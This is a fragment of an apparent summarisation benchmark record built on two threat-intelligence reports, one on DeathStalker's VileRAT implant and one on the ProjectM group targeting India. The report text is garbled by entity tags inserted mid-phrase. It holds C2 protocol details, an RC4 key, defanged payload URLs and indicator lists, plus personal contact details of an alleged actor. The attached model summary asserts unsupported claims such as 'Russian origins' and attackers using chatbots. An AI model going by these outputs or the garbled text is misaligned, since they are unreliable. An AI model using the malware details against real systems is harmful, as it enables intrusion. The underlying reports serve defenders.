quote(b64encode(encrypt_xor(rc4_encrypt(json.dumps(data).encode('utf-8 ' ) ) ) ) , safe=\"~ ( ) * ! .'\")return enc_dataFigure [CARDINAL] 14 . VileRAT [CARDINAL] C2 request preparation functionJust as in [ORG] VileLoader , the [ORG] User - Agent value in HTTP requests is randomly selected from a fixed list of possible values . The JSON that is passed to the C2 server can be broken down as follows : JSON Key Fixed value set to \u201c svc \u201d . True if VileRAT is executed with the xmode command line switch ; false otherwise . True if VileRAT is executed with the pmode command line switch ; false otherwise . Internal C2 command request type , value can be get_cmd , update_done , screenshot , first_run , install_done or klgr . Internal VileRAT version number as set in VileRAT \u2019s configuration . Internal VileRAT implant name as set in VileRAT \u2019s configuration . Partial value of [CARDINAL] one of the mutexes VileRAT sets to ensure atomic execution . It can either be the same system [ORG] UUID as the [CARDINAL] one collected by [ORG] VileDropper as part of the target identifier generation , or a hard - coded one . The target identifier , generated again with the same algorithm used in [ORG] VileDropper . A hard - coded value , or the same system [ORG] UUID as the [CARDINAL] one collected by [ORG] VileDropper as part of the target identifier generation , but represented using a different ( and presumably older ) custom algorithm . Hostname of the target machine . Username of the target . [CARDINAL] 1 if the user running VileRAT has administrator privileges ; [CARDINAL] 0 otherwise . Windows version , formatted as dwMajorVersion.dwMinorVersion ( eg . [CARDINAL] 10.0 ) . Timestamp of the HTTP request , formatted as YYYY - MM - DD HH - MM - SS . VileRAT \u2019s filename . JSON list of installed security products names ( e.g. , [ \u201c windows defender \u201d , \u201c kaspersky internet security \u201d ] ) , as retrieved from [ORG] WMI by VileRAT.The [CARDINAL] C2 answer is expected as an encoded and encrypted JSON list ( leveraging the same coding and cryptographic methods as for the JSON in the HTTP request ) . Each item in the list must be a JSON dictionary that contains at least a \u201c cmd \u201d key . Its value can be one of : update_svc , ssh_rshell , r_cmd , [DATE] ssh_rdyn or update_conf . Additional JSON key / value pairs can exist in the dictionary and are passed to internal commands as parameters . A few words about VileRAT \u2019s infrastructureWe looked for specificities in the C2 domains we could retrieve from the samples gathered ( either malicious DOCX files , [GPE] DOTM files and their macros , [ORG] VileDropper , [ORG] VileLoader or VileRAT ) and that are described in this report . We ignored domains registered before mid - [DATE] October [DATE] 2021 because most of them were already disclosed in public sources ( all known malicious domains and [ORG] IPs are listed in full in the indicators of compromise section below ) . It should be noted that to date , we have identified [CARDINAL] hundreds of domains associated with VileRAT \u2019s infection chain . This allowed us to identify some likely VileRAT - specific infrastructure creation preferences : Starting from [DATE] October [DATE] 2021 at the latest , [ORG] DeathStalker infrastructure IPs all belong to [PRODUCT] AS42159 ( [ORG] DELTAHOST [ORG] UA , located in [ORG] NL ) . According to our telemetry , [ORG] DeathStalker likely started to leverage servers with [ORG] IP addresses from this AS ( along with others ) [DATE] as [DATE] early [DATE] as [DATE] June [DATE] 2021;12/21Malicious domain names are often batch - registered ( several domains on [DATE] the [DATE] same [DATE] day ) at NAMECHEAP , Porkbun LLC or [ORG] PDR [ORG] Ltd. ; A lot of malicious domain names try to masquerade as seemingly legitimate digital services providers names ( such as \u201c azcloudazure[.]com \u201d or \u201c amzbooks[.]org \u201d ) , and some denote a possible attempt to leverage events of worldwide interest to conduct attack campaigns ( such as \u201c weareukrainepeople[.]com \u201d or \u201c covidsrc[.]com \u201d ) ; Domain usage seems to be separated most of the time ( [CARDINAL] one domain is used only for either infection DOCX / DOTM , [ORG] VileLoader or VileRAT ) , and might indicate a desire by the threat actor to tightly cluster its operations . But all those domains usually point to a very limited set of [ORG] IP addresses ; A quick analysis of the characteristics of the services exposed on [CARDINAL] C2 IPs during malicious activities allowed us to note common signatures : the HTTP service sends a combination of content and header values that could only be retrieved for such malicious infrastructure . VileRAT \u2019s targetsFrom [DATE] August [DATE] 2021 to [DATE] the [DATE] present [DATE] day , using only data that we could check with our own telemetry , we identified [CARDINAL] 10 compromised or targeted organizations in [GPE] Bulgaria , [GPE] Cyprus , [GPE] Germany , the [GPE] Grenadines , [GPE] Kuwait , [GPE] Malta , [GPE] the [GPE] United [GPE] Arab [GPE] Emirates and [GPE] the [GPE] Russian [GPE] Federation ( see Figure [DATE] 15).Figure [DATE] 15 . Map of organizations targeted by [ORG] DeathStalker \u2019s VileRAT campaign ( darker color indicates a higher concentration)We could not profile all the identified organizations , but [CARDINAL] half of them were foreign currency ( [ORG] FOREX ) and cryptocurrency exchange brokers . Some identified malicious documents and infrastructure domains contain ( parts of ) the targeted organizations \u2019 names , and confirm this targeting . It should be noted that the identified organizations range from recent startups to established industry leaders , including dubious cryptocurrency exchange platforms . Locating such organizations is extremely difficult from the limited data we have at hand , because a small [ORG] FOREX [ORG] company might , for instance , host its infrastructure in various foreign countries , employ several remote workers from different countries , and be legally based in a tax haven . AttributionWhen we [ORDINAL] first discovered VileRAT in [DATE] June [DATE] 2020 , we initially attributed the implant and associated infection chain to [ORG] DeathStalker . This [ORDINAL] first attribution was mainly based on similarities with previously known EVILNUM campaigns ( common specific metadata in [ORG] LNK files , similar TTPs \u2013 notably the spear - phishing approach leveraging [FAC] Google [FAC] Drive files and fake personas , consistent victimology ) . The tie between EVILNUM campaigns and [ORG] DeathStalker has already been demonstrated in our previous article . We still believe with high confidence that the described updated implants and associated infection chain are developed and operated by [ORG] DeathStalker : The main implants ( [ORG] VileLoader , VileRAT ) that are leveraged for this campaign are updates of previously analyzed ones , and still share a large majority of code and implementation specifics with previous samples ; The various components of the described infection chain ( DOCX , macro - enabled [GPE] DOTM , [ORG] VileDropper ) share implementation logic and techniques that have previously been leveraged by [ORG] DeathStalker as part of other campaigns ( PowerSing and [ORG] PowerPepper notably):Using malicious documents ( fetched from emails ) as an infection vector ; Signaling infection progress and errors to remote servers ; Using a similarly implemented XOR algorithm for string obfuscation ( in [GPE] DOTM macros , and in previously documented [ORG] PowerPepper loaders ) ; [ORG] Leveraging [ORG] Office object properties as hidden data sources ; Using similarly implemented hash - like functions with a preset constant ( to generate a target identifier in [ORG] VileDropper , to decode an [ORG] IP address in PowerSing).13/21ConclusionVileRAT , its loader and associated infection chain were continuously and frequently updated for [DATE] more [DATE] than [DATE] two [DATE] years , and are still leveraged to persistently target foreign currency and cryptocurrency exchange brokers , with a clear intent to escape detection . Escaping detection has always been a goal for [ORG] DeathStalker , for as long as we [ORG] \u2019ve tracked the threat actor . But the VileRAT campaign took this desire to another level : it is undoubtedly the most intricate , obfuscated and tentatively evasive campaign we have ever identified from this actor . From state - of - the - art obfuscation with [ORG] VBA and [ORG] JS , to multi - layered and low - level packing with Python , a robust multi - stage in - memory [ORG] PE loader , and security vendor- specific heuristic bypasses , nothing has been left to chance . Considering the vast and quickly changing associated infrastructure as well , there is no doubt [ORG] DeathStalker is making a tremendous effort to develop and maintain accesses . Yet , there are some glitches and inconsistencies : a final payload weighing [CARDINAL] more [CARDINAL] than [CARDINAL] 10 MB ( VileRAT ) , simple infection vectors , lots of suspicious communication patterns , noisy and easily identified process executions or file deployments , as well as sketchy development practices leaving bugs and requiring frequent implant updates . As a result , an efficient and properly setup endpoint protection solution will still be able to detect and block most of VileRAT \u2019s related malicious activities . Putting these facts into perspective , we believe [ORG] DeathStalker \u2019s tactics and practices are nonetheless sufficient ( and have proven to be ) to act on soft targets who may not be experienced enough to withstand such a level of determination , who may not have made security [CARDINAL] one of their organization \u2019s top priorities , or who frequently interact with [ORDINAL] third parties that did not do so . We still , however , can not determine what [ORG] DeathStalker \u2019s principal intention against such targets is : it could range from due diligence , asset recovery , information gathering in the context of litigation or arbitration cases , aiding its customers in working around sanctions and/or spying on the targets \u2019 customers , but it still does not appear to be direct financial gain . Indicators of compromise Infection DOCX MD5 hashes09FB41E909A0BCA1AB4E08CB15180E7C FF2558571EE99ED4AEC63A3980719034Macro - enabled [GPE] DOTM remote templates MD5 hashes02C1EC61C4E740AF85B818A89E77E2C2 E6F9D538FCDF46493DF8ECB648F98D13VileDropper JavaScript MD5 hashes3C8052862B194F205AC5138BF07ADFBE CABAF29E9763D18B0D0DFFBC576FDF3EVileLoader ( stage 1 binary ) MD5 hashes0456FA74B8CC6866C5D1CE9E15136723 FFE01DCCC1AA70C80EBB1B9F8FCADF1FVileRAT ( standalone ) MD5 hashes348C99A209616FC674FCABCAFDDBA4A0 6E79535F38248C7769365881C577DF29C2 IP addresses185.161.208[.]172 185.161.208[.]207 185.161.209[.]87 [CARDINAL] 185.161.208[.]209 185.161.208[.]20 185.161.208[.]225 [DATE] 185.236.76[.]230 [DATE] 185.236.76[.]30 185.236.76[.]34 [CARDINAL] 185.161.209[.]223 185.161.209[.]28 185.161.208[.]166 185.161.208[.]182 185.161.209[.]972022 - 07 , and [DATE] 2021 - 06 [DATE] to [DATE] 07 at least 2022 - 07 at least 2022 - 06 at least 2022 - 05 to 06 at least 2022 - 04 to 06 at least 2022 - 03 to 04 [CARDINAL] at [CARDINAL] least [CARDINAL] 2022 - 03 [CARDINAL] to [CARDINAL] 04 [CARDINAL] at [CARDINAL] least [CARDINAL] 2022 - 03 at least 2022 - 03 at least 2022 - 01 to 02 at least 2022 - 01 to 02 at least 2021 - 12 to 2022 - 01 at least 2021 - 12 at least 2021 - 11 and [DATE] 08 at least16/21185.236.76[.]21 185.161.209[.]117 185.161.208[.]64 185.161.208[.]194 [CARDINAL] 185.161.209[.]170 [CARDINAL] 185.161.208[.]160 193.56.28[.]201 185.236.230[.]252021 - [CARDINAL] 11 at least 2021 - 10 at least 2021 - 10 at least 2021 - 09 to 10 at least 2021 - 09 at least 2021 - 07 to 09 at least 2020 - 07 at least 2020 - 07 at leastC2 domain namesNote : the [CARDINAL] C2 domain names have been identified in our own telemetry or extracted from malicious files that are described in this article and that we analyzed . The domains may still have previously ( or later ) been used for legitimate purposes as domains may get reused over time . Even if we could not notice such a conflict up to now , the resolution of a hostname that belongs to such domain must better be checked to match previously listed C2 IP addresses , before concluding it is indicative of a compromise.rowfus[.]com ihotel - deals[.]com windowslive - detect[.]com amazoncld[.]com17/21printauthors[.]com audio - azure[.]com azure - affiliate[.]com service - azure[.]com scan - eset[.]com check - avg[.]com api - pixtools[.]com api - printer - spool[.]com driver - wds[.]com msft - cdn[.]cloud windows - accs[.]live windows - ddnl[.]com book - advp[.]com refinance - ltd[.]com am - reader[.]com anyfoodappz[.]com18/21cloudazureservices[.]com checkpoint - ds[.]com global - imsec[.]com apple - sdk[.]com cloudreg - email[.]com bookfinder - ltd[.]com crm - domain[.]net leads - management[.]net telefx[.]netSuspected C2 domain namesNote : the suspected [CARDINAL] C2 domain names have been identified because they were both registered in a similar way than known [CARDINAL] C2 domain names , AND because associated hostnames pointed to known C2 IP addresses during a timeframe of known malicious activity . While we believe with medium to high confidence the vast majority of these19/21domains have been or could be leveraged by [ORG] DeathStalker , it is still possible that a few of them never support malicious activities.adsoftpic[.]com aidobe - update[.]com amzn - services[.]com mcafee - secd[.]com oauth - azure[.]com pdfscan - now[.]com cloud - appint[.]com bingapianalytics[.]com20/21mscloudin[.]com msft - dev[.]com print - hpcloud[.]com inetp - service[.]com mailservice - ns[.]com xlmfx[.]com[1 ] This is an expected result from the standard [ORG] CPython build chain : the build configuration will automatically tag a binary with such version naming if compilation is done from sources that do not match a defined tag ( for instance , 3.7.4 ) or are modified.[2 ] All JSON dictionaries required by commands are URL - encoded , base64 - encoded , and RC4 - encrypted with a base64 - encoded RC4 key of \u201c XMpPrh70/0YsN3aPc4Q4VmopzKMGvhzlG4f6vk4LKkI= \u201d ( starting from VileRAT [CARDINAL] 3.0 ; previous samples use a different key).21/21", "generated_text": "VileRAT malware; a Python implant; foreign exchange; cryptocurrency trading companies; September 2020; June 2022; malicious email; documents; a URL; Google Drive; a command; system commands; arbitrary system commands; VileLoader; a malware; the infection; a DOCX attachment; chatbots; mail; harvesting; the installer; the target; the infection vector; the malware; the attackers; the attachment; data; the victim; the DOCX; the victim; its infrastructure; this campaign; Russian; Russian; the group; the victim; its capabilities; the threat actor; law enforcement; intelligence.", "ref_text": "<START-1>The document discusses the ongoing activities of a financially-motivated threat actor group called DeathStalker. The campaign, attributed to DeathStalker, has been ongoing since at least August 2020 with various malicious activities including Janicab, Evilnum, and PowerSing campaigns. In particular, it focuses on DeathStalker's use of a Python remote access trojan (RAT) called VileRAT and its associated infection chain to target foreign currency and cryptocurrency exchanges since mid-2020. VileRAT is delivered via spearphishing emails containing weaponized Word docs. The docs fetch a malicious macro document that profiles the target system and deploys the next stage - an obfuscated JavaScript backdoor called VileDropper. This backdoor drops and executes VileLoader, a custom .NET binary loader. VileLoader connects to a command and control server to download the final payload, which is the VileRAT Python RAT. VileRAT allows the threat actor full remote control, including command execution, keylogging, screenshotting, etc. It uses HTTP requests with encrypted JSON data to communicate with its C2. VileRAT and its associated malware have been continuously updated over 2+ years while targeting the same types of financial organizations globally. The intricate obfuscation and evasion techniques match DeathStalker's usual tactics. The report details the evolution of the malware, the encoding schemes, C2 infrastructure, intended targets, and other technical analysis. The attacks are still ongoing, indicating DeathStalker's determination to gain persistent access to currency exchanges for likely financial gain, although the exact motivation remains unclear. The report aims to provide thorough IOCs and recommendations to detect this advanced malware campaign victimizing the finance sector worldwide. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4454976303317536, "gpt3/lexical/rouge_rouge2": 0.0761904761904762, "gpt3/lexical/rouge_rougeL": 0.20853080568720378, "gpt3/lexical/rouge_rougeLsum": 0.20853080568720378, "gpt3_generated_text": ["The article discusses the continuous and evolving attack campaign by the threat actor DeathStalker, using the VileRAT malware, targeting foreign exchange and cryptocurrency trading companies. The campaign, which started in September 2020 and has continued through June 2022, involves malicious emails containing DOCX attachments or links to malicious files hosted on Google Drive. The malware, VileRAT, is a Python implant that uses arbitrary system commands to compromise the target's system. The attackers have also utilized chatbots on targeted companies' websites to send malicious documents. The article provides an overview of the infection and toolset deployment, as well as the concealment techniques used by the attackers. It highlights the increased efforts of the threat actor and the need for potential targets to be vigilant in detecting and stopping such malicious activities. The campaign's infrastructure and capabilities are also detailed, with a focus on the group's Russian origins. The article emphasizes the importance of public awareness and law enforcement intelligence in combating this threat."]}, {"split_name": "test", "sample_id": "test_15", "prompt_text": "Extract the keywords: [CARDINAL] 2POSTED BY : [PERSON] Robert [PERSON] Falcone and Simon Conant on [DATE] March 25 , [DATE] 2016 10:00 AMFILED IN : Threat Prevention , Unit 42 TAGGED : Operation C - Major , Operation Transparent Tribe , ProjectM , [PERSON] TrojanBe the [ORDINAL] first to receive the latest news , cyber threat intelligence and research from Unit 42 . Subscribe Now . Unit [CARDINAL] 42 is currently researching an attack campaign that targets government and military personnel of [GPE] India . This attack appears to overlap with [LAW] the [LAW] Operation [LAW] Transparent [LAW] Tribe [LAW] and [LAW] Operation C - Major campaigns that targeted [NORP] Indian embassies in [GPE] Saudi [GPE] Arabia and [GPE] Kazakhstan , as well as the [NORP] Indian military . We are tracking the group of actors involved in this campaign as \u2018 ProjectM. \u2019 During our research , we found a linkage between the infrastructure used by ProjectM and an individual from [GPE] Pakistan . We can not definitively confirm this individual is involved with this attack campaign , but the evidence that we will discuss in this blog post suggests that it is highly likely that this individual has some involvement with the threat group . This blog post highlights the trail of evidence individuals leave on the Internet when they are not careful about disguising their identity . All of the information collected about this actor is public and accessible through open source research . The ProjectM actors rely on both spear - phishing emails and watering hole sites to deliver a variety of different tools to target the [NORP] Indian government and military . ProjectM actors used a blog with a theme related to the [NORP] Indian military titled \u201c [WORK_OF_ART] India [WORK_OF_ART] News [WORK_OF_ART] Tribe \u201d ( intribune.blogspot.com ) as a watering hole to deliver their payloads . This group also used spear - phishing emails with malicious [ORG] RTF files exploiting CVE-2010 - 3333 or CVE-2012 - 0158 , in addition to [PRODUCT] Excel files that contained malicious macros to download and install their payloads as well . The actors have access to a sizeable toolset of [NORP] Trojans that they use in their attack campaigns , including custom developed tools called [PERSON] Crimson and Peppy , along with off - the - shelf remote administration tools ( RATs ) and downloaders , such as DarkComet and [ORG] Bozok . Another interesting part of this campaign is the use of techniques and [NORP] Trojans often seen in cybercrime attacks , such as the use of [ORG] the [ORG] Andromeda [ORG] Trojan as an initial payload in their attacks to download and execute other tools in their toolset . The Operation Transparent Tribe report by [PERSON] Darien [PERSON] Huss of [GPE] Proofpoint provides an excellent analysis of the various tools used by this group , including [PERSON] Crimson and [PERSON] Peppy and their associated infrastructure . During our research , we analyzed the registration information of the [ORG] Andromeda , [PERSON] Crimson and [PERSON] Peppy [PERSON] Trojan command and control domains used by [PERSON] ProjectM. A majority of the infrastructure associated with ProjectM was registered using [ORG] WHOIS protection services , which conceals the actual registrant \u2019s information ( name , email , etc . ) used to register the domain name . However , we discovered that the actors had in all likelihood , inadvertently neglected to use [ORG] WHOIS protection on [CARDINAL] two domains in their infrastructure that they used to host [CARDINAL] C2 servers for [ORG] the [ORG] Andromeda [ORG] Trojan . The [CARDINAL] two undisguised domains were \u201c winupdater[.]info \u201d and \u201c ordering - checks[.]com \u201d , which were registered using the email address \u201c mshoaib.yaseen [ at ] gmail.com \u201d , as seen in Figure [CARDINAL] 1 . The [ORG] Andromeda samples used these undisguised domains to deliver [PRODUCT] Peppy [PRODUCT] Trojans that used the previously observed ProjectM domain \u201c bbmdroid.com \u201d as a C2 server . The email address and information used to register these domains appears to be real and associated with the actor , which differs from most infrastructure used in targeted attacks that use fake information and a disposable email account during registration . On [DATE] August [DATE] 5 , [DATE] 2014 , the actor seemingly discovered his mistake as the \u201c ordering - checks[.]com \u201d domain was updated with [ORG] WHOIS protection . Get Updates Sign up to receive the latest news , cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE \u2192Ignite 2016 : Conquering the Cyber Range posted by [PERSON] Chad [PERSON] Berndtson on [DATE] April [DATE] 6 , [DATE] 2016 How the New PAN - OS 7.1 Release Bene\ufb01ts Government Organizations   posted by [PERSON] Pamela [PERSON] Warren on [DATE] April [DATE] 6 , [DATE] 2016 [DATE] Ignite [DATE] 2016 : A Next - Generation Security Platform Built for the Prevention Age posted by [PERSON] Chad [PERSON] Berndtson on [DATE] April [DATE] 5 , [DATE] 2016 Announcing [ORG] PAN - OS [CARDINAL] 7.1 : Extending Breach Prevention to the Cloud posted by [PERSON] Chris [PERSON] Morosco on [DATE] April [DATE] 5 , [DATE] 2016 [DATE] Rejoice ! [CARDINAL] Eight New Books Inducted into the Cybersecurity Canon posted by [PERSON] Rick [PERSON] Howard on [DATE] April [DATE] 5 , [CARDINAL] 2016MORE \u2192Domain Name : winupdater.infoDomain Name : ordering - checks.comRegistrant ID : CR144993459Created On : 2014 - 02 - 11Registrant Name : Xtex StudiosExpiration Date : [DATE] 2015 - 02 - 11Registrant Organization : Xtex StudiosRegistrant Name : [PERSON] Muhammad [PERSON] KamranRegistrant [PERSON] Street : R-240 Sector 15ARegistrant Street1 : R02323 KarachiRegistrant City : KarachiRegistrant City : [ORG] KarachiRegistrant State / Province : [ORG] SindhRegistrant State / Province : [ORG] SindhRegistrant [ORG] Postal [ORG] Code : 74200Registrant Postal Code : 74200Registrant Country : [ORG] PKRegistrant [ORG] Country : PKRegistrant Phone : +92.3452183117Registrant Phone : +92 [CARDINAL] 3452183117Registrant Phone Ext : Registrant Fax : +92 3452183117Registrant Fax : Registrant Fax Ext : Registrant Email : mshoaib.yaseen@gmail.comRegistrant [PERSON] Email : mshoaib.yaseen@gmail.comFigure [CARDINAL] 1 WHOIS Information for Two Command and [ORG] Control [ORG] Domains without [PERSON] Whois [PERSON] ProtectionThe [PERSON] Gmail address seen in Figure [CARDINAL] 1 is directly linked to Facebook , [GPE] LinkedIn , Google+ , and [ORG] Skype accounts . All of the accounts have corroborative biographical content , giving us a possible identity of a potential actor , who appears to be a 26 - year - old individual from [GPE] Karachi , [GPE] Pakistan . At this time , we can not absolutely confirm this individual \u2019s involvement with ProjectM , Operation Transparent Tribe or Operation C - Major campaigns ; however , strong evidence was discovered linking this individual \u2019s online presence to entities related to the threat group , which can be seen in the chart in Figure [CARDINAL] 2 . Additionally , content posted to the social networking accounts suggest that the actor has an anti - [NORP] Indian sentiment , which may be a motivating factor for the actor to participate in such attack campaigns . Figure [CARDINAL] 2 Diagram of links between the actor and [GPE] ProjectMWe believe the individual associated with the email address \u201c mshoaib.yaseen [ at ] gmail.com \u201d was at one time and possibly still involved in web design services , as well as revenue generating efforts using [PRODUCT] Google [PRODUCT] AdSense . Interestingly , it appears that the individual reused servers and domains set up during web design efforts to host malicious content used in attack campaigns as well . The web design and technology services company hosted at \u201c apnits[.]4t[.]com \u201d listed the phone number \u201c 0345 - 2183117 \u201d for its chief executive and as its support number . This phone number is the same as seen in the registration information in Figure [CARDINAL] 1 without the country code \u201c +92 \u201d . We did not find any malicious content on this site ; however , we did find content that suggests it was last revised in [DATE] November [DATE] 2006.Another web design company created by the individual was discovered at \u201c xtexhosts.com \u201d . The phone number \u201c +92.3452183117 \u201d was also found in the [ORG] WHOIS information and was registered using the email \u201c spid3rsoft [ at ] gmail.com \u201d . We do not have any indication of malicious content hosted on xtexhosts.com , but it appears that the actor created it for [PERSON] Xtex [PERSON] Studios , which appears to be another web design company started by the actor . We found a [ORDINAL] third domain , \u201c easternkingsology[.]com , \u201d that contained registration information with the name \u201c [WORK_OF_ART] Xtex [WORK_OF_ART] Studios \u201d and the registration email of \u201c mshoaib.yaseen [ at ] gmail.com \u201d until the domain expired in [DATE] December [DATE] 2015 . The \u201c easternkingsology[.]com \u201d domain hosted a [ORG] Bozok RAT sample at hxxp://easternkingsology[.]com / det / dllbb.exe ( SHA256 : the threat actor hosted this [GPE] Trojan on an Xtex Studios related domain for use in a ProjectM campaign . Figure [CARDINAL] 3 shows an advertisement of the services provided by [PERSON] Xtex [PERSON] Studios using \u201c mshoaib.yaseen [ at ] gmail.com \u201d and \u201c karachian.gem [ at ] hotmail.com \u201d for contact purposes . Figure [CARDINAL] 3 [ORG] Website [ORG] Advertising [ORG] Xtex [ORG] Studios Services Linking [CARDINAL] Two Email AddressesWe found the registration phone number and email address for [ORG] xtexhosts[.]com on an advertisement for another web design company called [NORP] SPID3R[.]SOFT . The advertisement seen in Figure [CARDINAL] 4 was hosted on \u201c sahirlodhi[.]com \u201d , which was a domain also used by ProjectM as the download location for a sample of the [PERSON] Crimson tool . At [ORDINAL] first we hypothesized that sahirlodhi[.]com may have been a compromised site , as it appeared to be the official site for the [NORP] Pakistani television actor [PERSON] Sahir [PERSON] Lodhi . On [DATE] May [DATE] 10 , [DATE] 2008 , the domain registration information was updated to include the registrant email of \u201c mshoaib.yaseen[at]gmail.com \u201d , suggesting the threat actor was involved in the creation of this website . The registration information for this domain remained the same until [DATE] May 21 , [DATE] 2014 when it was updated to include [ORG] WHOIS privacy protection . We believe that the threat actor still had access to the sahirlodhi[.]com webserver and used it to host the payload for ProjectM , further suggesting that the actor reuses domains and servers to host content and payloads unrelated to its original purpose . Figure [CARDINAL] 4 Advertisement of SPID3R.SOFT Web [PERSON] DesignIn addition to [ORG] xtexhosts[.]com , the domain \u201c thefriendsmedia[.]com \u201d was also registered using the email \u201c spid3rsoft[at]gmail.com \u201d . This domain hosts a multimedia website that claims it is \u201c Asia \u2019s [WORK_OF_ART] Biggest [WORK_OF_ART] Entertainment [WORK_OF_ART] Portal \u201d . Unit 42 saw this domain hosting several ProjectM tools , including the exact same [PERSON] Andromeda and Peppy samples as those previously observed using [ORG] bbmdroid[.]com as a C2 , which were hosted at \u201c /est / estma.exe \u201d and \u201c /est / controller.exe \u201d respectively . The \u201c thefriendsmedia[.]com \u201d site makes references to \u201c thefriendsfm[.]com \u201d , which was originally registered in [DATE] October [DATE] 2010 using the email \u201c mshoaib.yaseen[at]gmail.com \u201d . On [DATE] March 24 , [DATE] 2014 , the actor shared a link on his Facebook ( figure [CARDINAL] 5 ) and Google+ accounts to an article hosted on \u201c thefriendsfm[.]com \u201d titled \u201c MOD Assistant Director and Staff [PERSON] Grade [PERSON] NTS [PERSON] Results [DATE] 2014 \u201d , which is currently still present on the \u201c thefriendsmedia[.]com \u201d domain . The post discusses applying for positions at [ORG] the [ORG] Pakistani [ORG] Ministry [ORG] of [ORG] Defense ( MOD ) , but we do not have any conclusive evidence that the actor applied to or is connected in anyway with the MOD.Figure 5 Actor \u2019s Facebook post to an article regarding jobs in [GPE] Pakistan \u2019s [ORG] Ministry [ORG] of [ORG] DefenseThe email address \u201c karachian.gem[at]hotmail.com \u201d seen in the advertisement of [PERSON] Xtex [PERSON] Studios led to the discovery of the possible identity of an individual that is likely involved with ProjectM. Unit [CARDINAL] 42 found the individual \u2019s Google+ profile , seen in Figure [CARDINAL] 6 and noticed that the profile had several posts that included domains that had hosted payloads or were [CARDINAL] C2 servers associated with ProjectM , such as : bbmdroid[.]com ( Peppy , Bozok)shobitech[.]com ( Peppy , DarkComet , Andromeda)mustache - styles[.]com ( Andromeda)messagerieneuf[.]com ( Crimson)sahirlodhi[.]com ( Crimson)Figure [CARDINAL] 6 Possible Actor Involved with ProjectMAlso , Facebook and Google+ posts include \u201c Bind an exe in excel file | Microsoft Excel Exploit | [ORG] ShobiTech \u201d ( Figure [CARDINAL] 7 ) , which is interesting as ProjectM has used malicious [PRODUCT] Excel deliverydocuments with macros to download and install payloads in its attack campaign . Figure [CARDINAL] 7 \u2013 Actor discusses technique seen in campaignsThe \u201c shobitech[.]com \u201d domain also appeared in one of the actor \u2019s Facebook accounts . This Facebook account provided a great deal of information about the actor , specifically in the photos section . The actor used the [ORG] shobitech[.]com domain in [DATE] 2013 to host details of a training course ( Figure [CARDINAL] 8) that he was conducting on how to monetize [ORG] YouTube using [PRODUCT] Google [PRODUCT] AdSense . Figure [CARDINAL] 8 Advertisement Associated with a Training Conducted by [ORG] ActorThe photos also show the actor obtained a certificate for completing [LAW] the \u201c Windows [LAW] Exploit [LAW] Development [LAW] Megaprimer \u201d online course hosted on udemy.com and screenshots of the actor using various offensive security tools , such as [GPE] Metasploit on [PERSON] Kali [PERSON] Linux ( Figure [CARDINAL] 9 ) . The Operation Transparent Tribe report suggested that Meterpreter samples were used as payloads in the campaign , which is interesting as Meterpreter is part of [FAC] the [FAC] Metasploit [FAC] Framework that the individual has had experience with according to the photos uploaded to his Facebook account . Figure [CARDINAL] 9 Photo Uploaded to Facebook Account of Individual Using MetasploitFurthermore , another Facebook account belonging to this actor points to \u201c shoaibyaseen[.]com \u201d , which appears to host this individual \u2019s personal blog . The blog has a total of [CARDINAL] twelve posts [DATE] between [DATE] February 29 , [DATE] 2016 , and [DATE] March [DATE] 2 , [DATE] 2016 . The topics posted to this blog include network port scanning and data gathering techniques , as well as commands to run using [GPE] Metasploit and Meterpreter to accomplish various tasks to exploit systems and carry out post - exploitation activities . While the use of Meterpreter in Figure [CARDINAL] 9 and the topics in the \u201c shoaibyaseen[.]com \u201d blog in Figure [CARDINAL] 10 do not directly implicate this individual , it does strongly suggest that he possesses skills that would be valuable to offensive campaigns like those conducted by ProjectM.Figure [CARDINAL] 10 Recent posts on the actor \u2019s blog with topics including [GPE] Metasploit and post exploitationactivitiesAnother interesting observation about this actor is that his name shows up in the debug symbol path of several [PERSON] Crimson tools . The actor \u2019s name appears in the debug symbol path of samples of the [PERSON] Crimson downloader and the remote administration tool , suggesting the actor may have been involved with the development of this [GPE] Trojan . For instance , the following shows an example of the actor \u2019s name in the debug symbol path of a [PERSON] Crimson downloader ( SHA256 : Client\\secure_scan\\secure_scan\\obj\\x86\\Debug\\secure_scan.pdbThe email address \u201c karachian.gem[at]hotmail.com \u201d also led us to the individual \u2019s blogger account , which was created in [DATE] April [DATE] 2008 . The \u201c [WORK_OF_ART] About [WORK_OF_ART] Me \u201d section of this blogger account states that this individual lives in [GPE] Karachi , [GPE] Pakistan and studied computer science . This account also created several other blogs as well , most of which had little content of interest with the following exceptions : bbmdroid[.]blogspot[.]comindian - attack[.]blogspot[.]comFreeowlsofminerva[.]blogspot[.]comFigure 11 Picture of Individual Associated with [PERSON] Blogger [PERSON] AccountsThe [ORDINAL] first related blog of interest is bbmdroid[.]blogspot[.]com that contains a link to \u201c bbmdroid[.]com \u201d , which hosted C2 services for various ProjectM tools . The indian- attack[.]blogspot[.]com does not contain any malicious exploit code or payloads , but has a theme of terrorism in [GPE] India . A blog with a theme related to [GPE] India closely resembles [ORG] the [ORG] India [ORG] News [ORG] Tribe ( intribune[.]blogspot[.]com ) blog that ProjectM used in Operation Transparent Tribe to deliver [GPE] Crimson payloads . The \u201c freeowlsofminerva[.]blogspot[.]com \u201d blog was created on [DATE] August 24 , [DATE] 2013 , to offer a service for players of the [ORG] MapleStory MMORPG . The links on the blog point to [PRODUCT] Excel spreadsheets hosted on \u201c microsoftexcel[.]united - host[.]us \u201d , such as : hxxp://microsoftexcel[.]united - host[.]us / [PERSON] Downloads/(Bera)%20FM%20Price%20List.xlsThe blog also includes a link at the bottom of the page to a [ORG] VirusTotal scan of a file named \u201c ( Bera ) FM Price List.xlsx \u201d that showed that no antivirus vendors detected the file as malicious . We do not have access to the spreadsheets hosted \u201c microsoftexcel[.]united - host[.]us \u201d to confirm if they were malicious or not ; however , we did observe a DarkComet payload ( SHA256 : server at \u201c microsoftexcel[.]united - host[.]us / update.exe \u201d . The fact that a payload was hosted on this server leads us to believe the inclusion of the link to a [ORG] VirusTotal analysis is a social engineering attempt to increase the likelihood a victim would click the links . Figure [CARDINAL] 12 Use of VirusTotal Report to Increase Likelihood of Victim Clicking LinksProjectM is a threat group conducting targeted attacks on government and military personnel of [GPE] India . Unit [CARDINAL] 42 has linked several different domains within ProjectM \u2019s infrastructure to an individual residing in [GPE] Pakistan . This corresponds with the suspicions of [PERSON] David [PERSON] Sancho and [PERSON] Feike [PERSON] Hacquebord at [ORG] Trend [ORG] Micro , who documented a likely [NORP] Pakistani link to the activity in their Operation C - Major report . At this time , we can not elaborate on the extent of this individual 